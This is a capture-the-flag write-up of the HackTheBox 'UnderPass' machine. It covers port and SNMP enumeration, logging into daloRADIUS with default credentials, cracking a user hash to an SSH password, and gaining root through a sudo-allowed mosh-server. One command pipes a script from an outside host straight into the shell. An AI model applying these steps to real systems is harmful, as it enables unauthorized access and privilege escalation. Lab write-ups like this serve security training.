---
title: HackTheBox UnderPass
category: hackthebox
excerpt: UnderPass is a HTB easy linux machine, Created by dakkmaddy. The Box is mainly based on Enumerations and basic priv escalations.
header:
  overlay_color: "#000"
  overlay_filter: "0.75"
  overlay_image: /assets/images/sample/Underpass/underpass.jpg
  teaser: /assets/images/sample/Underpass/underpass.jpg
tags: HTB Linux
classes: wide
toc: true
comments: true
---






### Nmap scan:

```
Starting Nmap 7.94 ( https://nmap.org ) at 2025-01-08 22:49 PST
Nmap scan report for 10.10.11.48
Host is up (0.047s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.56 seconds

```

### Trying Dirby:

```
└─$ dirb http://10.10.11.48   

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Jan  8 22:51:43 2025
URL_BASE: http://10.10.11.48/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.11.48/ ----
+ http://10.10.11.48/index.html (CODE:200|SIZE:10671)                                                                                                                          
+ http://10.10.11.48/server-status (CODE:403|SIZE:276)                                                                                                                         
-----------------
END_TIME: Wed Jan  8 22:56:03 2025
DOWNLOADED: 4612 - FOUND: 2

```
 
 Found noting intresting so far. Quickly checking with a UDP scan using nmap

#### UDP Enumeration:

```
└─$ sudo nmap -sU --top-ports 100 10.10.11.48 
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2025-01-08 22:59 PST
Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 10.25% done; ETC: 23:00 (0:00:35 remaining)
Nmap scan report for 10.10.11.48
Host is up (0.20s latency).
Not shown: 97 closed udp ports (port-unreach)
PORT     STATE         SERVICE
161/udp  open          snmp
1812/udp open|filtered radius
1813/udp open|filtered radacct

Nmap done: 1 IP address (1 host up) scanned in 130.06 seconds
```

Found that port number 161 is open with service SNMP:

Next will be using a MSFs aux scanner for SNMP enum:

![1.png](/assets/images/sample/Underpass/1.png)

![1.png](/assets/images/sample/Underpass/2.png)

```
[+] 10.10.11.48, Connected.

[*] System information:

Host IP                       : 10.10.11.48
Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
Contact                       : steve@underpass.htb
Location                      : Nevada, U.S.A. but not Vegas
Uptime snmp                   : 11:03:16.58
Uptime system                 : 11:03:06.35
System date                   : 2025-1-9 06:48:46.0


[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

From the above Information, we can observe that there is a host name related to some thing to `daloradious`. 

Exploring more about on this, I quickly came to understand that daloradius is a framework for deployment of FreeRADIUS servers.

| Remote Authentication Dial-In User Service is a networking protocol that provides centralized authentication, authorisation, and accounting management for users who connect and use a network service.

If we look at the git repo, we can observe that there are multiple folders which contain details to more pages which contain some login pages. 

`Users`
`Operators`
`common`

So navigating to the paths will lang to the login page.  

```
1. http://underpass.htb/daloradius/app/users/login.php
2. http://underpass.htb/daloradius/app/operators/login.php
```

![1.png](/assets/images/sample/Underpass/3.png)

![1.png](/assets/images/sample/Underpass/4.png)

Now, I'll quickly check the if I can access that directory of that name.

##### Default Creds:

The default creds can be found from the wiki doc below:

https://github.com/lirantal/daloradius/wiki/Installing-daloRADIUS



Use the default creds against the machine will grant the login access.

Note: The creds will only work with the URL with /operators/

![1.png](/assets/images/sample/Underpass/6.png)

After login, we can navigate to the user management and check for other users in the application, by navigating to the top right corner of the web app.

![1.png](/assets/images/sample/Underpass/7.png)

Username: svcMosh
HASH: 412DD4759978ACFCC81DEAB01B382403

Using crack station to crack the hash of the users.


![1.png](/assets/images/sample/Underpass/8.png)

```
Username: svcMosh
Password: underwaterfriends
```

Now, login via ssh with the compromised username and password. 

```
└─$ ssh svcMosh@underpass.htb
The authenticity of host 'underpass.htb (10.10.11.48)' can't be established.
ED25519 key fingerprint is SHA256:zrDqCvZoLSy6MxBOPcuEyN926YtFC94ZCJ5TWRS0VaM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'underpass.htb' (ED25519) to the list of known hosts.
svcMosh@underpass.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Jan  9 08:26:01 AM UTC 2025

  System load:  0.68              Processes:             249
  Usage of /:   90.8% of 3.75GB   Users logged in:       1
  Memory usage: 18%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%

  => / is using 90.8% of 3.75GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jan  9 08:18:47 2025 from 10.10.14.42
svcMosh@underpass:~$ ls
user.txt
svcMosh@underpass:~$ cat user.txt 
```


### Privilege escalation:

The traditional way to search for privilege escalation technique is by using linpeas.sh

Link: https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

`svcMosh@underpass:~$ curl -L http://10.10.14.13:8000/linpeas.sh | sh`

The other way around to check privileages to check by using `sudo -l` 

![1.png](/assets/images/sample/Underpass/9.png)

The line `(ALL) NOPASSWD: /usr/bin/mosh-server` is typically part of a `sudoers` configuration file. It specifies permissions for the `sudo` command and determines how certain users or groups can execute specific commands with elevated privileges.

The above basically means that, this line appears in the `sudoers` file (edited with `visudo`), a user could run:

```
sudo /usr/bin/mosh-server
```

Now execute the below command to connect to local host and gain root access.

```
mosh --server="sudo /usr/bin/mosh-server" localhost
```
![1.png](/assets/images/sample/Underpass/11.png)

![1.png](/assets/images/sample/Underpass/10.png)